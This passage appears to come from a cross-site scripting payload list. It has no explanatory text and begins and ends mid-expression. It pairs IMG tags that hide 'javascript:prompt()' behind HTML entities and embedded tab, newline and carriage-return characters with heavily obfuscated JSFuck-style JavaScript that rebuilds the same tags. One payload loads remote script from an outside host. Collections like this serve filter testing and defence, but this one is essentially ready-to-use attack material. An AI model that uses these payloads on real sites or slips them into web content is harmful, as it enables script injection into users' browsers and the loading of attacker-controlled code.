String.fromCharCode(35)")()+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#112;&#114;&#111;&#109;&#112;&#116;&#40;25&#41;>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+!+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+!+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+!+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000112&#0000114&#0000111&#0000109&#0000112&#0000116&#000004027&#0000041>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x70&#x72&#x6F&#x6D&#x70&#x74&#x2829&#x29>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+[])[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<IMG SRC="jav	ascript:prompt(31);">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+[]["constructor"]["constructor"]("return String.fromCharCode(9)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<IMG SRC="jav&#x09;ascript:prompt(33);">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<IMG SRC="jav&#x0A;ascript:prompt(35);">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+[]+[])[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<IMG SRC="jav&#x0D;ascript:prompt(37);">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+[]+[])[0]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<IMG SRC=" &#14;  javascript:prompt(39);">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+(false+[0]+"")[7]+(false+[0]+"")[7]+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<SCRIPT/XSS-41 SRC="http://xss.rocks/xss.js"></SCRIPT>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return 